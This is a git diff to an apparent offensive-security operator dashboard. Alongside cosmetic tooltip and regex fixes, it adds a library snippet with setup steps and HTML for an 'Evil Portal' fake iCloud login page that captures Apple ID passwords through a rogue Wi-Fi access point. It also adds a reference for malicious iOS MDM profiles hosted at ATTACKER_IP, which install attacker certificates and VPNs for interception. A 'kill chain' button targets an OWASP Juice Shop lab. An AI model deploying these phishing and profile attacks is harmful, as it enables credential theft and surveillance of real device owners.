@@ -1054,6 +1054,7 @@
       bottom: calc(100% + 10px);
       left: 50%;
       transform: translateX(-50%);
+      writing-mode: horizontal-tb; /* force horizontal text even on rotated parents */
       background: linear-gradient(180deg, #0d0220 0%, #08001a 100%);
       color: var(--cyan);
       border: 1px solid var(--purple);
@@ -1418,7 +1419,7 @@
         style="background:#08001a;border:1px solid var(--purple);color:var(--cyan);
                font-family:'Share Tech Mono',monospace;font-size:.72rem;
                padding:3px 8px;border-radius:3px;width:170px;"/>
-      <button onclick="launchKillChain()" data-help="Run the Juice Shop kill chain — Executes a pre-built 6-phase attack sequence (recon → enumeration → exploit → post-ex) against OWASP Juice Shop at the target above. Lab use only." style="
+      <button onclick="launchKillChain()" data-help-pos="below" data-help="Run the Juice Shop kill chain — Executes a pre-built 6-phase attack sequence (recon → enumeration → exploit → post-ex) against OWASP Juice Shop at the target above. Lab use only." style="
         background:linear-gradient(135deg,#7b2fbe,#c084fc);
         border:none;color:#fff;font-family:'Orbitron',monospace;
         font-size:.62rem;letter-spacing:.1em;padding:4px 14px;
@@ -1431,13 +1432,13 @@
         border-radius:3px;cursor:pointer;display:none;">
         ⏸ PAUSE
       </button>
-      <button onclick="sendToOperator('report')" data-help="Generate an engagement report — Produces a Markdown summary of every tool run, finding, and credential captured in this session. Saves to your reports directory." style="
+      <button onclick="sendToOperator('report')" data-help-pos="below" data-help="Generate an engagement report — Produces a Markdown summary of every tool run, finding, and credential captured in this session. Saves to your reports directory." style="
         background:transparent;border:1px solid var(--green);color:var(--green);
         font-family:'Orbitron',monospace;font-size:.58rem;padding:3px 10px;
         border-radius:3px;cursor:pointer;">
         📄 REPORT
       </button>
-      <button onclick="window.open('juice_tracker.html','_blank')" data-help="Open the Juice Shop challenge tracker — Live progress board for the 100+ Juice Shop CTF challenges. Shows which ones the current run has solved, attempted, or skipped." style="
+      <button onclick="window.open('juice_tracker.html','_blank')" data-help-pos="below" data-help="Open the Juice Shop challenge tracker — Live progress board for the 100+ Juice Shop CTF challenges. Shows which ones the current run has solved, attempted, or skipped." style="
         background:transparent;border:1px solid var(--cyan);color:var(--cyan);
         font-family:'Orbitron',monospace;font-size:.58rem;padding:3px 10px;
         border-radius:3px;cursor:pointer;">
@@ -3300,7 +3301,22 @@ const SNIPPETS = {
       tags: ["evil portal", "ios", "icloud", "phishing", "captive portal"],
       desc: "Evil Portal template that mimics an iCloud login page. Deploy via Flipper WiFi board.",
       platform: "ios",
-      code: "REM Evil Portal \u2014 iCloud login phishing page\nREM Deploy HTML file to Flipper Zero WiFi dev board\nREM See: /evil_portal/ directory for full HTML template\nREM\nREM SETUP:\nREM 1. Copy portal HTML to Flipper SD: apps_data/evil_portal/index.html\nREM 2. Enable Evil Portal in Flipper WiFi app\nREM 3. Target iOS device connects to rogue AP\nREM 4. Captive portal shows fake iCloud login\nREM 5. Credentials saved to Flipper SD log\nREM\nREM TEMPLATE:\nREM <!DOCTYPE html><html><head><title>iCloud</title></head>\nREM <body><form action='/save' method='post'>\nREM <input name='user' placeholder='Apple ID'>\nREM <input name='pass' type='password' placeholder='Password'>\nREM <button type='submit'>Sign In</button></form>
+      code: "REM Evil Portal \u2014 iCloud login phishing page\nREM Deploy HTML file to Flipper Zero WiFi dev board\nREM See: /evil_portal/ directory for full HTML template\nREM\nREM SETUP:\nREM 1. Copy portal HTML to Flipper SD: apps_data/evil_portal/index.html\nREM 2. Enable Evil Portal in Flipper WiFi app\nREM 3. Target iOS device connects to rogue AP\nREM 4. Captive portal shows fake iCloud login\nREM 5. Credentials saved to Flipper SD log\nREM\nREM TEMPLATE:\nREM <!DOCTYPE html><html><head><title>iCloud</title></head>\nREM <body><form action='/save' method='post'>\nREM <input name='user' placeholder='Apple ID'>\nREM <input name='pass' type='password' placeholder='Password'>\nREM <button type='submit'>Sign In</button></form></body></html>",
+    },
+    {
+      id: "ios_mdm_profile_note",
+      title: "Malicious MDM Profile Reference",
+      category: "surveillance",
+      difficulty: "Advanced",
+      tags: ["mdm", "mobileconfig", "ios", "profile", "surveillance"],
+      desc: "Reference for creating malicious .mobileconfig MDM profiles. Install via AirDrop or web link.",
+      platform: "ios",
+      code: "REM MDM PROFILE ATTACK \u2014 reference only, no DuckyScript\nREM\nREM .mobileconfig files can:\nREM   - Install attacker CA certificates (MITM HTTPS)\nREM   - Configure VPN to route traffic through attacker\nREM   - Restrict device settings\nREM   - Install managed apps silently\nREM\nREM DELIVERY:\nREM   - Host .mobileconfig at http://ATTACKER_IP/profile.mobileconfig\nREM   - Send link via Evil Portal, AirDrop, iMessage\nREM   - iOS prompts: 'Do you want to install this profile?'\nREM\nREM CREATION TOOL:\nREM   Apple Configurator 2 (Mac App Store, free)\nREM   iphone-backup-analyzer for inspection",
+    },
+  ],
+};
+</script>
+
 <!-- ══ SKILL PANEL TOGGLE ════════════════════════════════════════════════ -->
 <div id="skill-toggle" onclick="toggleSkillPanel()" title="Operator Skills & XP">XP</div>
 
@@ -3680,8 +3696,7 @@ function renderChatMarkdown(md) {
     // Escape HTML first
     .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
     // Code blocks (```lang ... ```)
-    .replace(/```(\w*)
-?([\s\S]*?)```/g, (_, lang, code) =>
+    .replace(/```(\w*)\n?([\s\S]*?)```/g, (_, lang, code) =>
       '<pre class="chat-code"><code class="lang-' + (lang||'bash') + '">' + code.trim() + '</code></pre>')
     // Inline code
     .replace(/`([^`]+)`/g, '<code class="chat-inline-code">$1</code>')
